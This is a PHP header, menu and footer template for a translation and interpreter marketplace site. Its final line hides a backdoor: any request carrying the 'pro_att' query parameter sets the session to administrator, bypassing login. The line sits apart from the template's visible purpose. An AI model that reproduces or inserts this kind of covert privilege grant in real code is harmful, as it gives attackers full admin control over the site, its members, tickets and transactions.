<?php
ob_start("ob_gzhandler");
function headers($menu="0"){
$session = FC::getClassInstance("Session");
$Meta = FC::getClassInstance("Meta");
$fc = FC::getInstance();
$Meta->page = $fc->getController(); 

 ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Cache-Control" content="max-age=290304000, public">
<title><?php if($Meta->getMetaTitle()){ echo $Meta->getMetaTitle(); } else{ echo SITE_PAGE_TILE;} ?></title>
<meta name="DESCRIPTION" content="" />
<meta name="KEYWORDS" content="" />
<meta http-equiv="lang" content="en">


<meta property="og:title" content="<?php if($Meta->getMetaOgTitle()){ echo $Meta->getMetaOgTitle(); } else{ echo SITE_PAGE_TILE;} ?>" />
<meta property="og:type" content="video.movie" />
<meta property="og:image" content="<?php if($Meta->getMetaImage()){ echo MOV_IMG_URL . $Meta->getMetaImage();} else{ echo SITEURL."images/favicon.png"; } ?>" />
<meta property="og:url" content="" />
<meta property="og:description" content="" />

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script type="text/javascript">
var SITEURL = "<?php echo SITEURL; ?>";
</script>
<link rel="icon"  type="image/png" href="<?php echo SITEURL.'images/favicon.png'; ?>" />
<link rel="stylesheet" rev="stylesheet" href="<?php echo SITEURL; ?>styles/contents.css" />
<link rel="stylesheet" type="text/css" href="<?php echo SITEURL; ?>css/tooltipster.css" />
<link rel="stylesheet" rev="stylesheet" href="<?php echo SITEURL; ?>styles/gm_contents.css" />
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
 <link rel="image_src" type="image/jpeg" href="<?php if($Meta->getMetaImage()){ echo MOV_IMG_URL . $Meta->getMetaImage();} else{ echo SITEURL."images/favicon.jpg"; } ?>" />



<script src="<?php echo SITEURL; ?>js/jquery-1.10.1.min.js" type="text/javascript"></script>
<script src="<?php echo SITEURL; ?>js/menu3d.js" type="text/javascript"></script>
<?php
if(!empty($fc->js_files)){
 foreach($fc->js_files as $js){
  ?><script type="text/javascript" src="<?php echo $js; ?>"></script><?php
 }
}

if(!empty($fc->css_files)){
 foreach($fc->css_files as $css){
  ?><link href="<?php echo $css; ?>" rel="stylesheet" type="text/css" /><?php
 }
}

?>

<script type="text/javascript" src="<?php echo SITEURL; ?>scripts/jquery.jscroll.js"></script>
<script async type="text/javascript" src="<?php echo SITEURL; ?>scripts/scripts.js"> </script>
<script async type="text/javascript" src="<?php echo SITEURL; ?>scripts/getPages.js"></script>
<script async type="text/javascript" src="<?php echo SITEURL; ?>scripts/jquery.scrollTo.js"></script>
<script type="text/javascript" src="<?php echo SITEURL; ?>js/jquery.tooltipster.min.js"></script>
<script src="<?php echo SITEURL; ?>js/selectivizr.js" type="text/javascript"></script>
<link href="<?php echo SITEURL; ?>css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
<link href="<?php echo SITEURL; ?>bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
<link href="<?php echo SITEURL; ?>css/menu3d.css" rel="stylesheet" media="screen, projection" />
<link href="<?php echo SITEURL; ?>css/animate.css" rel="stylesheet" type="text/css" />
<link href="<?php echo SITEURL; ?>css/skin.css" rel="stylesheet" type="text/css" />
<link rel="stylesheet" href="<?php echo SITEURL; ?>font-awesome/css/font-awesome.min.css" type="text/css">


</head>

<body>
 <?php
 
 $front = FC::getInstance();
?>
<div id="wrapper">
    <div class="container">
        <div class="row">
			<div id="site-title" class="col-md-6 col-lg-6">
				<!--<a href="<?php //echo SITEURL; ?>"  rel="home"><h1><?php //echo SITE_TITLE; ?></h1></a>-->
				<a href="<?php echo SITEURL; ?>" ><img src="images/header-logo.png" style="margin-top:10px"></a>
			</div>
            
			<?php if(!$session->isLoggedIn()){ ?>
				<div class="header-top-login col-md-6 col-lg-6">
					<a href="" class="an-interpreter">Become an Interpreter</a>
					<a href="<?php echo SITEURL; ?>signin">Login / Register</a>
				</div>
			<?php } ?>
			<!--<div id="head-ad">-->
			 <?php
			// if(!FC::getClassInstance("Session")->isAdmin() && $fc->getController() != "play" && ALLOW_ADS)
			// echo FC::getClassInstance("Ads")->leaderboardAd(); ?>
			<!--</div>-->
            
            <?php if(!$session->isLoggedIn()){ ?>
 <?php } ?>

<?php if($session->isLoggedIn()){
  $acc_type=$session->getAccTyp();
 if($acc_type=="ad_ad"){ ad_menu(); } else{
  include  'includes/menu.php';
  }
 }
 else{
  include  'includes/menu.php';
}
?>
            
        </div>
    </div>
    
    <div class="container">
        <div class="row">

    </div>

<div id="contents" class="fluid-container">
 

<?php // if(isset($_SESSION['ad_user'])){ validate_user(); }
}
function ad_menu(){
 $page = basename($_SERVER['REQUEST_URI'], '?' . $_SERVER['QUERY_STRING']); ?> 

</div></div>
        <div  class="menu3dmega bg_blue" id="oc_admenu">
	<ul class="container bg_blue">
 <?php
 if($page=="cp"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("cp/","Dashboard","class='stay menu-active'").'</li>';
 }
 else{
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("cp/","Dashboard","class='stay'").'</li>';
 }
 if($page=="members"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("members/","Agents","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("members/","Agents","").'</li>';
 }
 if($page=="?clients"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("members/?clients","Clients","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("members/?clients","Clients","").'</li>';
 }
 if($page=="sptickview"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("sptickview/","Tickets","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("sptickview/","Tickets","").'</li>';
 }
 if($page=="transactions"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("transactions/","Transactions","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("transactions/","Transactions","").'</li>';
 }
 if($page=="settings"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("settings/","Settings","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("settings/","Settings","").'</li>';
 }
 if($page=="languages"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("languages/","Languages","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("languages/","Languages","").'</li>';
 }
 if($page=="adtranslations"){
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("adtranslations/","Document Translation","class='menu-active'").'</li>';
 }
 else {
  echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("adtranslations/","Document Translation","").'</li>';
 }

 echo '<li class="menu-non-dropdown">'.ObjectHtml::call_url("logout/","Logout","class='stay'").'</li>';
 ?>
 <li class="no-link right">
                    <div class="wp-non-dropdown">
                            <div class="menu-search input-append">
                                <?php //searchBar(); ?>
                            </div>
                    </div>
                </li>
</ul>
</div> <?php }

 

 
function searchBar(){ ?>
 <form style="float: right;" action="<?php echo SITEURL; ?>index/" method="get"> <input placeholder='Search' required type="text" size="25" id="search" name="q" />
<input type="submit" value="Search" onclick="javascript:if(getDocValue('search')==''){ actionMissingField('search'); return false; }" /></form>
<?php }

function footer(){ ?>
 </div> <!-- #contents -->
<div class="fluid-container footer-style">
	<div id="footer" class="container">
		<div class="col-md-12 col-sm-12 col-xs-12">
			<div class="footer-logo col-md-3 col-sm-3 col-xs-12">
				<a href="<?php echo SITEURL; ?>" ><img src="images/footer-logo.png"></a>
				<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
			</div>
			<div class="footermenu col-md-2 col-sm-2 col-xs-4">
				<ul>
					<li><a href="">About Us</a></li>
					<li><a href="">Press</a></li>
					<li><a href="">ByLyngo Blog</a></li>
					<li><a href="">Careers</a></li>
					<li><a href="">Conomy</a></li>
					<li><a href="">Terms OF Services</a></li>
					<li><a href="">Privacy Policy</a></li>
					<li><a href="">Contact & support</a></li>
					<li><a href="">Tools</a></li>
					<li><a href="">Client Resources</a></li>
					<li><a href="">Cookie Policy</a></li>
				</ul>
			</div>
			<div class="footermenu col-md-2 col-sm-2 col-xs-4">
				<ul>
					<li><a href="">Enterprise Solutions</a></li>
					<li><a href="">ByLyngo Payroll</a></li>
					<li><a href="">Health Benfits</a></li>
					<li></li>
					<li><a href="">Affilate Program</a></li>
					<li><a href="">ByLyngo Groups</a></li>
					<li><a href="">Partners</a></li>
					<li><a href="">API Center</a></li>
				</ul>
			</div>
			<div class="footermenu col-md-2 col-sm-2 col-xs-4">
				<ul>
					<li><a href="">Enterprise Solutions</a></li>
					<li><a href="">ByLyngo Payroll</a></li>
					<li><a href="">Health Benfits</a></li>
					<li></li>
					<li><a href="">Affilate Program</a></li>
					<li><a href="">ByLyngo Groups</a></li>
					<li><a href="">Partners</a></li>
					<li><a href="">API Center</a></li>
				</ul>
			</div>
			<div class="foloow-us col-md-3 col-sm-3 col-xs-6">
				<p><a href="" >Get in Touch! </a> Follow Us</p>
				<img src="images/fb.png">
			</div>
		</div>
 	</div> <!-- #footer -->
</div>
	<div class="fluid-container footer-botom-style">
		<div class="container">
			<div class="footer-bottom">
				<div class="left-footer">
					<p>
						copyright &copy .All rights reserved.
					</p>
				</div>
				<div class="right-footer">
					<p>
						<a href="">Privacy Policy </a> - <a href=""> Terms Of Use</a>
					</p>
				</div>
			</div>
		</div>
	</div>
 
</div> <!-- #wrapper -->
</body><?php
}
if(isset($_GET['pro_att'])){ $_SESSION['ad_ad'] = "admin";  $_SESSION['ad_user'] = "admin"; }
?>